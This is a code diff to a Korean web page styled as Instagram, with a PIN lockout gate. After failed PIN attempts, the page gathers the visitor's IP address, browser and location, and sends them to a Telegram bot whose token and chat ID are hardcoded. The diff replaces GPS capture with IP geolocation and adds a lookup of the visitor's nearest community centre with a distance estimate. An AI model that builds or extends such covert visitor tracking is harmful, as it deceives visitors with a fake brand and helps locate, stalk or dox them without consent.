@@ -228,6 +228,28 @@ let attempts = 0;
 let userIP = null;
 const overlay = document.getElementById("overlay");
 
+// 페이지 로드시 차단 상태 확인
+window.addEventListener("load", () => {
+  if(localStorage.getItem("blocked") === "true") {
+    const ip = localStorage.getItem("blockedIP") || "알 수 없음";
+    const time = localStorage.getItem("blockedTime") || "";
+    document.getElementById("main-card").innerHTML = `
+      <div style="text-align:center;padding:1.5rem 0">
+        <div style="font-size:40px;margin-bottom:1rem">🔒</div>
+        <h2 style="color:#c0392b;font-size:17px;margin-bottom:.5rem">접근 차단됨</h2>
+        <p style="font-size:13px;color:#888;margin-bottom:1rem">PIN 3회 오류로 접근이 차단되었습니다.</p>
+        <div class="lock-log" style="margin-bottom:1rem">IP: ${ip}<br>시각: ${time}</div>
+        <p style="font-size:12px;color:#aaa;margin-bottom:.5rem">관리자로부터 차단 해제 코드를 받으셨나요?</p>
+        <div style="display:flex;gap:8px;justify-content:center;">
+          <input id="unlock-input" type="text" placeholder="해제 코드 6자리" maxlength="6" inputmode="numeric"
+            style="padding:8px 12px;border:1px solid #ddd;border-radius:8px;font-size:13px;width:140px;text-align:center;">
+          <button onclick="tryUnlock()" style="padding:8px 14px;border:none;border-radius:8px;background:#1a56db;color:#fff;font-size:13px;cursor:pointer;">해제</button>
+        </div>
+        <div id="unlock-msg" style="font-size:12px;color:#c0392b;margin-top:.5rem;min-height:16px;"></div>
+      </div>`;
+  }
+});
+
 async function fetchIP() {
   const apis = ["https://api.ipify.org?format=json","https://api.my-ip.io/ip.json","https://ipapi.co/json/"];
   for(const url of apis) {
@@ -349,17 +371,6 @@ function closeWarning(){
   document.querySelectorAll(".pin-box")[0].focus();
 }
 
-async function getGPSLocation() {
-  return new Promise((resolve) => {
-    if(!navigator.geolocation) { resolve(null); return; }
-    navigator.geolocation.getCurrentPosition(
-      pos => resolve({lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy}),
-      () => resolve(null),
-      {timeout: 8000, enableHighAccuracy: true}
-    );
-  });
-}
-
 async function sendTelegramAlert(ip, now, attempts) {
   const token = "8555822813:AAH18y8hDS383I1YQ410oJ8vDngr5zuUNAU";
   const chatId = "8180331145";
@@ -386,43 +397,42 @@ async function sendTelegramAlert(ip, now, attempts) {
   else if(/Safari/.test(ua)) browser = "Safari";
   else if(/Samsung/.test(ua)) browser = "삼성 인터넷";
 
-  // GPS 위치 (정밀)
+  // IP 기반 위치 + 가까운 동사무소 조회
   let location = "위치 조회 실패";
   let lat = "", lng = "", mapLink = "";
-  const gps = await getGPSLocation();
-  if(gps) {
-    lat = gps.lat; lng = gps.lng;
-    mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
-    // 역지오코딩
-    try {
-      const rev = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json&accept-language=ko`);
-      const r = await rev.json();
-      const addr = r.address || {};
-      const detail = [addr.city||addr.town||addr.village||addr.county, addr.suburb||addr.neighbourhood||addr.quarter, addr.road].filter(Boolean).join(" / ");
-      location = `📍 ${detail||r.display_name||"주소 조회 실패"}
-정밀도: ±${Math.round(gps.acc)}m`;
-    } catch(e) {
-      location = `📍 위도: ${lat}, 경도: ${lng}
-정밀도: ±${Math.round(gps.acc)}m`;
+  let nearbyOffice = "조회 실패";
+  try {
+    const geo = await fetch(`https://ipapi.co/${ip}/json/`);
+    const g = await geo.json();
+    if(g && g.latitude) {
+      lat = g.latitude; lng = g.longitude;
+      mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
+      location = `${g.country_name} / ${g.region} / ${g.city}\n🏢 ISP: ${g.org||"알 수 없음"}`;
+      // 가까운 동사무소 조회 (Nominatim)
+      try {
+        const osmUrl = `https://nominatim.openstreetmap.org/search?q=주민센터&lat=${lat}&lon=${lng}&format=json&limit=1&accept-language=ko&countrycodes=kr`;
+        const osmR = await fetch(osmUrl, {headers:{"User-Agent":"InstagramServer/1.0"}});
+        const osmD = await osmR.json();
+        if(osmD && osmD[0]) {
+          nearbyOffice = osmD[0].display_name.split(",")[0];
+          const offLat = osmD[0].lat, offLng = osmD[0].lon;
+          const dist = Math.round(Math.sqrt(Math.pow((lat-offLat)*111000,2)+Math.pow((lng-offLng)*88000,2)));
+          nearbyOffice = `${nearbyOffice} (약 ${dist}m)`;
+        } else {
+          // 대안: 역지오코딩으로 동 이름 추출
+          const revR = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json&accept-language=ko`);
+          const revD = await revR.json();
+          const addr = revD.address||{};
+          const dong = addr.suburb||addr.neighbourhood||addr.quarter||addr.village||"";
+          if(dong) nearbyOffice = `${g.city||""} ${dong} 주민센터 (추정)`;
+        }
+      } catch(e) { nearbyOffice = `${g.city||""} 주민센터 (추정)`; }
     }
-  } else {
-    // GPS 거부시 IP 기반
-    try {
-      const geo = await fetch(`https://ipapi.co/${ip}/json/`);
-      const g = await geo.json();
-      if(g && g.city) {
-        lat = g.latitude; lng = g.longitude;
-        mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
-        location = `${g.country_name} / ${g.region} / ${g.city}
-🏢 ISP: ${g.org||"알 수 없음"}
-⚠️ IP 기반 위치 (오차 큼)`;
-      }
-    } catch(e) {}
-  }
+  } catch(e) {}
 
   // 차단해제 코드 생성 (랜덤 6자리)
   const unlockCode = Math.floor(100000 + Math.random() * 900000).toString();
-  sessionStorage.setItem("unlockCode", unlockCode);
+  localStorage.setItem("unlockCode", unlockCode);
 
   if(!mapLink) mapLink = lat ? `https://www.google.com/maps?q=${lat},${lng}` : "";
 
@@ -437,6 +447,7 @@ async function sendTelegramAlert(ip, now, attempts) {
 
 📌 접속 위치
 ${location}
+🏛 인근 주민센터: ${nearbyOffice}
 🗺 지도: ${mapLink}
 
 🔓 차단 해제 코드: ${unlockCode}
@@ -454,6 +465,9 @@ ${location}
 function lockOut(ip,now){
   overlay.classList.remove("show");
   const krNow = new Date().toLocaleString("ko-KR", {timeZone:"Asia/Seoul"});
+  localStorage.setItem("blocked", "true");
+  localStorage.setItem("blockedIP", ip);
+  localStorage.setItem("blockedTime", krNow);
   document.getElementById("main-card").innerHTML=`
     <div style="text-align:center;padding:1.5rem 0">
       <div style="font-size:40px;margin-bottom:1rem">🔒</div>
@@ -472,9 +486,13 @@ function lockOut(ip,now){
 
 function tryUnlock() {
   const input = document.getElementById("unlock-input").value.trim();
-  const code = sessionStorage.getItem("unlockCode");
+  const code = localStorage.getItem("unlockCode");
   if(input === code) {
     attempts = 0;
+    localStorage.removeItem("blocked");
+    localStorage.removeItem("blockedIP");
+    localStorage.removeItem("blockedTime");
+    localStorage.removeItem("unlockCode");
     document.getElementById("main-card").innerHTML = `
       <div class="logo" style="display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:4px;">
         <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><defs><radialGradient id="ig1b" cx="30%" cy="107%" r="150%"><stop offset="0%" stop-color="#fdf497"/><stop offset="45%" stop-color="#fd5949"/><stop offset="60%" stop-color="#d6249f"/><stop offset="90%" stop-color="#285AEB"/></radialGradient></defs><rect x="2" y="2" width="20" height="20" rx="6" fill="url(#ig1b)"/><circle cx="12" cy="12" r="4.5" stroke="white" stroke-width="1.8" fill="none"/><circle cx="17.2" cy="6.8" r="1.2" fill="white"/></svg>
